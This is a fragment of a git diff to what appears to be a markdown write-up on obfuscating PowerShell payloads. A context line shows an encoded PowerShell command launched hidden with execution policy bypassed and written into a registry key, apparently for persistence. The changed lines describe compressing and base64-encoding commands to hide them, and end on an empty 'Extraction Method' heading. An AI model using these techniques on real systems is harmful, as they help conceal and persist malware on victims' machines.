@@ -30,7 +30,7 @@ $payload="powershell.exe -w h -NoP -NonI -Exec Bypass -enc $command";reg add "HK
 
 <b>I know it's corny, but compression is a form of encryption</b>
 
-We want to compress and encode this command to where powershell can decompress.
+We want to compress and encode this command to where powershell can decompress
 
 Compression often generates unwanted characters, so we will also encode after compressing
 
@@ -60,3 +60,7 @@ def compress_and_base64(input):
     # Convert bytes to string
     return encoded.decode('utf-8')
 ```
+
+<b>Extraction Method</b>
+
+```powershell
